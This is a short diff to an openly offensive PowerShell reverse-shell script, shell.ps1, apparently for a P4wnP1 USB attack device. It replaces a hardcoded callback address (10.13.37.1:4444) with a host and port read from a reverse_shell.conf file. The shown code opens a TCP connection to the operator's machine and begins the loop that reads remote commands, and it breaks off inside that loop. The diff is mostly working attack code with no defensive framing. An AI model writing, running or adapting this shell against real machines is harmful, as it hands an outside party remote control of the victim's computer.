@@ -1,5 +1,9 @@
+$conf = Get-Content "/opt/p4wnp1/config/reverse_shell.conf" | ConvertFrom-StringData
+$HOST = $conf["RS_HOST"]
+$PORT = [int]$conf["RS_PORT"]
+
 # shell.ps1
-$client = New-Object System.Net.Sockets.TCPClient("10.13.37.1",4444);
+$client = New-Object System.Net.Sockets.TCPClient($HOST,$PORT);
 $stream = $client.GetStream();
 [byte[]]$bytes = 0..65535|%{0};
 while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
